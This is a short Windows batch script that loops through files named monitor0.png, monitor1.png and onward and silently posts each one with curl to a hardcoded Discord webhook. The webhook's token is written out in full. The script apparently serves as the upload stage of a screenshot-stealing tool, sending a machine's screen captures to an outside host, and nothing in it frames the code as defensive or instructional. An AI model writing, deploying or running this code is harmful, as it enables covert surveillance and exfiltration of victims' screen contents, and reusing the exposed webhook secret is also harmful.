@echo off
set WEBHOOK_URL=https://discord.com/api/webhooks/1491073066145677542/NlYoNlDnzPxXh4T3_QzmobOlqGoyw5G3g7HUiaIQa4VL5TM4r2XpyZnZ0Qh4WWocWarz
set i=0

:loop
if not exist "monitor%i%.png" goto done

curl -s -X POST -F "file=@monitor%i%.png" %WEBHOOK_URL%

set /a i+=1
goto loop

:done
exit /b 0
